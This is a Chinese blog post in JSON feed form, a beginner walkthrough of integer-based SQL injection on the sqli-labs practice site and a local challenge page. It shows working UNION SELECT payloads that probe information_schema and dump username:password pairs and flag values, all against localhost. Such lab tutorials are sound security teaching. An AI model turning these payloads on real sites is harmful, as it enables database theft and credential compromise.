{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden • All posts by \"sql注入\" tag",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/",
            "title": "整型注入",
            "date_published": "2022-09-28T16:27:56.000Z",
            "content_html": "<h1 id=\"sql注入之整型注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入之整型注入\">#</a> SQL 注入之整型注入</h1>\n<p>本篇使用整型注入来从 0 到 1 进入 “SQL 注入” 的大门。</p>\n<h2 id=\"环境准备\"><a class=\"markdownIt-Anchor\" href=\"#环境准备\">#</a> 环境准备</h2>\n<p>当然是先安装 phpStudy，然后一键傻瓜式安装后点击启动按钮</p>\n<p><img src=\"image-20220928202842147.png\" alt=\"image-20220928202842147\"></p>\n<p>之后点击 MySQL 管理器</p>\n<p><img src=\"image-20220928203059624.png\" alt=\"image-20220928203059624\"></p>\n<p>双击 localhost，账户名 root，密码 root 即可进入。</p>\n<p><img src=\"image-20220928203206981.png\" alt=\"image-20220928203206981\"></p>\n<p>打开浏览器，选择 sqli</p>\n<p><img src=\"image-20220928203903223.png\" alt=\"image-20220928203903223\"></p>\n<p>选择第一个 Setup</p>\n<p><img src=\"image-20220928203930840.png\" alt=\"image-20220928203930840\"></p>\n<p>出现这个界面，即完成了数据库的初始化</p>\n<p><img src=\"image-20220928203950837.png\" alt=\"image-20220928203950837\"></p>\n<p>点击后退键回到上一个页面，然后点击 Less-1</p>\n<p><img src=\"image-20220928204115026.png\" alt=\"image-20220928204115026\"></p>\n<p>出现 SQLI DUMB SERIES-1</p>\n<p><img src=\"image-20220928204123886.png\" alt=\"image-20220928204123886\"></p>\n<p>接下来以 Less-2 作为例子进行讲解：</p>\n<p><img src=\"image-20220928210728567.png\" alt=\"image-20220928210728567\"></p>\n<h2 id=\"sql注入步骤\"><a class=\"markdownIt-Anchor\" href=\"#sql注入步骤\">#</a> SQL 注入步骤</h2>\n<h3 id=\"1判断是否有注入判断是否未严格校验\"><a class=\"markdownIt-Anchor\" href=\"#1判断是否有注入判断是否未严格校验\">#</a> ①判断是否有注入 (判断是否未严格校验)</h3>\n<h4 id=\"1可控参数的改变能否影响页面的显示结果\"><a class=\"markdownIt-Anchor\" href=\"#1可控参数的改变能否影响页面的显示结果\">#</a> 1) 可控参数的改变能否影响页面的显示结果</h4>\n<p>网页让输入 id，可是我们并没有看到交互框，因此猜测有可能是需要发送请求。</p>\n<p>点击查看网页源代码，在 Network 这里看到是 GET 请求。</p>\n<p><img src=\"image-20220928213756712.png\" alt=\"image-20220928213756712\"></p>\n<p>因此我们选择在链接后面加上 id 参数</p>\n<p><img src=\"image-20220928213510534.png\" alt=\"image-20220928213510534\"></p>\n<p>发现成功令其输出内容。</p>\n<p>此时我们再次改变 GET 请求中 id 的值，发现，内容会对应有所变化。</p>\n<p><img src=\"image-20220928214022889.png\" alt=\"image-20220928214022889\"></p>\n<h4 id=\"2输入的sql语句是否能报错\"><a class=\"markdownIt-Anchor\" href=\"#2输入的sql语句是否能报错\">#</a> 2) 输入的 SQL 语句是否能报错</h4>\n<p>因为能通过数据库的报错，看到数据库的一些语句痕迹</p>\n<p>我们假设它后台的查询语句是</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> $id</span><br></pre></td></tr></table></figure>\n<p>猜想：能否通过加单引号令其出错？</p>\n<p>因为：</p>\n<p>如果是整型注入漏洞，则像 3’这样的字符传入 $id 处会引发错误。</p>\n<p>如果是单引号注入漏洞，像 3’这样的字符传入 $id 处也会引发错误。</p>\n<p><img src=\"image-20220928214501924.png\" alt=\"image-20220928214501924\"></p>\n<p>黄字部分的报错语句，非常之重要！</p>\n<p>near ‘xxxxxxxxxx’ at line 1 是在告诉我们在第 1 行的 xxxxxxx 语句处出现错误，而我们通过加入单引号使其发生错误，错误信息就会帮我们显示了出错的局部代码，也就是 “输出了单引号后面的语句”——LIMIT 0,1。</p>\n<p>为了再次确定 near ‘xxxxxxxxxx’ at line 1 中在 LIMIT 0,1 之前的一个单引号是我们输入的单引号，我们再次改变 GET 请求中 &quot;’ '&quot;（单引号）变为 &quot;&quot;&quot;（双引号）</p>\n<p><img src=\"image-20220928215359897.png\" alt=\"image-20220928215359897\"></p>\n<p>发现成功令报错信息中 near 'xxxxx’中的 LIMIT 前一个符号发生改变。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，加入单引号会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; limit 0,1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#如果是单引号注入，加入单引号也会报错</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27;&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>据目前输入的结果来看，此网页存在 “整型注入” 或者 “单引号注入”</p>\n<h4 id=\"3输入的sql语句能否不报错\"><a class=\"markdownIt-Anchor\" href=\"#3输入的sql语句能否不报错\">#</a> 3) 输入的 SQL 语句能否不报错</h4>\n<p>为了查看我们的语句能够成功闭合</p>\n<p>那怎么区分到底是整型还是单引号呢？</p>\n<p>使用 # 来注释后面语句</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#加入#号后，两个语法依旧错误，故都会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; # limit 0,1</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27; #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>结果确实是报错。</p>\n<p><img src=\"image-20220928220327744.png\" alt=\"image-20220928220327744\"></p>\n<p>接下来我们删掉单引号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，则删掉单引号，保留#号后，不会报错！</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> # limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">#如果是单引号注入，则删掉单引号，保留#号后，依旧会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"string\">&#x27;2 #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928220529170.png\" alt=\"image-20220928220529170\"></p>\n<h3 id=\"2什么类型的注入\"><a class=\"markdownIt-Anchor\" href=\"#2什么类型的注入\">#</a> ②什么类型的注入</h3>\n<p>因此，此处经过上述报错信息确定，存在<strong>整型注入</strong>！</p>\n<h3 id=\"3语句是否能够被恶意修改\"><a class=\"markdownIt-Anchor\" href=\"#3语句是否能够被恶意修改\">#</a> ③语句是否能够被恶意修改</h3>\n<p>恶意修改主要指能否再加入一些我们想要的判断条件，比如：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span># limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>如果是整型注入无误，这里条件为 “id = 2 and 0”—— 这是永假条件，则不会有任何查询结果。</p>\n<p><img src=\"image-20220928221547372.png\" alt=\"image-20220928221547372\"></p>\n<p>结果正如我们所料，空空如也。</p>\n<h3 id=\"4是否能够成功执行\"><a class=\"markdownIt-Anchor\" href=\"#4是否能够成功执行\">#</a> ④是否能够成功执行</h3>\n<p>第三个能满足，其实第四个就顺带就 OK。</p>\n<h3 id=\"5获取我们想要的数据\"><a class=\"markdownIt-Anchor\" href=\"#5获取我们想要的数据\">#</a> ⑤获取我们想要的数据</h3>\n<p>关键数据是保存在数据库里面的，关系如下：</p>\n<p>数据库 -&gt; 表 -&gt; 字段 -&gt; 值</p>\n<p>打开 MySQL，我们可以看到其中有 information_schema 库（这是 MySQL 自带的库，管理所有表信息）</p>\n<p><img src=\"image-20220928223622076.png\" alt=\"image-20220928223622076\"></p>\n<p>这个库中有三个表非常值得我们关注：</p>\n<p>Schemata 表（包含所有的 <code>库名信息</code> ）、Tables 表（包含所有的 <code>表名信息</code> ）、Columns 表（包含所有的 <code>列名信息</code> ）</p>\n<p><strong>首先是 Schemeta 表</strong>， <code>schema_name</code>  对应着所有数据库的名字。</p>\n<p><img src=\"image-20220928224006640.png\" alt=\"image-20220928224006640\"></p>\n<p><strong>其次是 Tables 表</strong>， <code>table_name</code>  这个列里，存储了 <code>table_schema对应的库</code> 下面的所有表</p>\n<p><img src=\"image-20220928224135720.png\" alt=\"image-20220928224135720\"></p>\n<p><strong>最后是 Columns 表</strong>，通过 <code>table_schema</code>  对应的库， <code>table_name</code>  对应的表，<strong>使用 column_name 对应的列名，来唯一地定位某个列</strong>。</p>\n<p><img src=\"image-20220928224405698.png\" alt=\"image-20220928224405698\"></p>\n<h4 id=\"1构造联合查询\"><a class=\"markdownIt-Anchor\" href=\"#1构造联合查询\">#</a> 1）构造联合查询</h4>\n<p>确定的整型注入中，我们需要构造出我们想要的查询内容，比如在<strong> information_schema 库</strong>的<strong> Schema 表</strong>中获取 <code>schema_name</code> ：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225341595.png\" alt=\"image-20220928225341595\"></p>\n<p>但如果像上面这样构造，会报错，我们需要使用到联合查询。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225106827.png\" alt=\"image-20220928225106827\"></p>\n<p>但是，如果像上面这样构造，依旧会报错，在 SQL 查询中，union 前后的两个列 ++<strong> 需要列数完全一致才可拼接</strong> ++。</p>\n<p>因此，需要使用占位符来定位前面的查询是多少列：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#占位一个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span> #</span><br><span class=\"line\">#占位两个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span> #</span><br><span class=\"line\">#占位三个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> #</span><br><span class=\"line\">....</span><br></pre></td></tr></table></figure>\n<p>注意，这里的 1,2,3 可以填任何数字或者符号，仅仅为了占位使用，<strong>可以被任意 “想要看到的输出内容” 覆盖</strong>。</p>\n<p>经过多次定位，我们最终得到：<strong>前面的查询</strong>使用到的是<strong> 3 个列</strong>。</p>\n<p><img src=\"image-20220928225313035.png\" alt=\"image-20220928225313035\"></p>\n<p>因此有：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225608030.png\" alt=\"image-20220928225608030\"></p>\n<p>虽然正确显示，但是我们查询的内容并没有显示出来。这是因为，使用 union 查询，<strong>还有个 bug</strong> 就是如果前面的查询有效，<strong>最终结果会在前面查询到的结尾后面拼接</strong>。</p>\n<p>为了让后面查询到的内容（我们 <code>想要看到的数据</code> ）提前，<strong>我们需要令前面的查询失效</strong>，简单的方法就是令 id = 39888 这样平常不会使用的奇怪数字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225926603.png\" alt=\"image-20220928225926603\"></p>\n<h4 id=\"2拼接多组内容在同一行输出-寻找所在库\"><a class=\"markdownIt-Anchor\" href=\"#2拼接多组内容在同一行输出-寻找所在库\">#</a> 2）拼接多组内容在同一行输出、寻找所在库</h4>\n<p>OK，我们在第二个占位符（也就是数字 2 所在的位置）上，看到输出了一个 schema_name，但是我们想要输出所有的 schema_name，怎么办？</p>\n<p>使用 MySQL 查询语句提供的 group_concat () 函数</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>可以看到，原本占位符 2 所在的位置，已经被一组输出内容所替换。</p>\n<p><img src=\"image-20220928230746841.png\" alt=\"image-20220928230746841\"></p>\n<p>除了 group_concat ()，我们还可以使用：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#输出当前使用数据库的名称</span><br><span class=\"line\">database() </span><br><span class=\"line\">#输出当前服务器中使用数据库的用户的名字和其对应的主机</span><br><span class=\"line\"><span class=\"keyword\">user</span>()</span><br><span class=\"line\">#输出当前数据库版本号</span><br><span class=\"line\">version()</span><br><span class=\"line\">#输出该服务器数据库安装路径（数据库安装在哪里）</span><br><span class=\"line\">@<span class=\"variable\">@basedir</span></span><br><span class=\"line\">#输出数据库中数据的存放路径（该存放路径下有各个数据库的数据、数据库中表的数据）</span><br><span class=\"line\">@<span class=\"variable\">@datadir</span></span><br><span class=\"line\">#输出操作系统的版本号</span><br><span class=\"line\">@<span class=\"variable\">@version</span>_compile_os</span><br><span class=\"line\">#md5(str)可以对传入的字符串进行，d5加密，并返回加密后得到的<span class=\"number\">32</span>位字符串。</span><br><span class=\"line\">md5(<span class=\"string\">&#x27;xxxx&#x27;</span>)</span><br><span class=\"line\">#使用某个拼接符如“:”来拼接str1和str2</span><br><span class=\"line\">concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, str1, str2)</span><br></pre></td></tr></table></figure>\n<p>接着我们查询所在数据库的名字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), database() <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>哦，原来是在 security 数据库中</p>\n<p><img src=\"image-20220928231402676.png\" alt=\"image-20220928231402676\"></p>\n<h4 id=\"3确定想从某个库中拿到什么表从表中拿到什么列\"><a class=\"markdownIt-Anchor\" href=\"#3确定想从某个库中拿到什么表从表中拿到什么列\">#</a> 3）确定想从某个库中拿到什么表，从表中拿到什么列</h4>\n<p>我们看看从 security 库中都可以读取什么表？</p>\n<p><strong>核心</strong> —— 在<strong> information_schema 库</strong>的<strong> Tables 表</strong>中，查询当 table_schema 的值为我们刚刚获取的 security 库时</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(table_name), database() <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928231639522.png\" alt=\"image-20220928231639522\"></p>\n<p><strong>获取到 security 库中的所有表为</strong>： <code>emails</code> 、 <code>referers</code> 、 <code>uagents</code> 、 <code>users</code></p>\n<p>我们比较关心账号密码相关，所以眼光聚焦到 users 表。</p>\n<p><strong>核心</strong> —— 在<strong> information_schema 库</strong>的<strong> Columns 表</strong>中，查询当<strong> table_schema</strong> 的值为我们刚刚获取的 <code>security</code>  且 <strong>table_name</strong> 为 <code>users</code>  时</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(column_name), database() <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() <span class=\"keyword\">and</span> table_name <span class=\"operator\">=</span> <span class=\"string\">&#x27;users&#x27;</span> #</span><br></pre></td></tr></table></figure>\n<p><strong>获取到 security 库中，users 表里所有列为</strong>： <code>id</code> 、 <code>username</code> 、 <code>password</code></p>\n<p><img src=\"image-20220928232355430.png\" alt=\"image-20220928232355430\"></p>\n<p>我们想要获取 username 和 password 的全部对应关系，使用 concat_ws 函数，把 username 和 password 用冒号拼接起来：</p>\n<p><strong>核心</strong> —— 由于已经知道了所在<strong> security 库</strong>，<strong>users 表</strong>，因此直接 <code>select xxxx from security.users</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, username, password)), <span class=\"number\">3</span> <span class=\"keyword\">from</span> security.users #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928232842359.png\" alt=\"image-20220928232842359\"></p>\n<p>小练习</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">1.</span>查看注入类型</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; # 报错(整型和单引号都会报错)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#2.确定整型注入</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 # (只有整型不会报错)</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#3.确定列数</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 union select 1, 2, 3 #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#4.构造联合查询,确定所在库名。</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), schema_name from information_schema.schemata #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: information_schema</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#5.确定在这个库中，都有什么表</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(table_name) from information_schema.tables where table_schema = database()#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: emails,flag,users</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#6.确定我们要找flag表，并看这个表中有什么列</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>flag<span class=\"string\">&#x27;#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag,value</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#7.取列的值，另外把查询的from 后面改成对应的&quot;库.表&quot;</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=2356 union select 1,database(), group_concat(concat_ws(&#x27;</span>:<span class=\"string\">&#x27;, flag, value)) from challenge.flag#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:any,flag8:sqlc,flag9:tasi,flag10:moo,flag12:false,flag11:muse</span></span><br></pre></td></tr></table></figure>\n<p>至此，整型注入演示完毕。</p>\n",
            "tags": [
                "SQL注入"
            ]
        }
    ]
}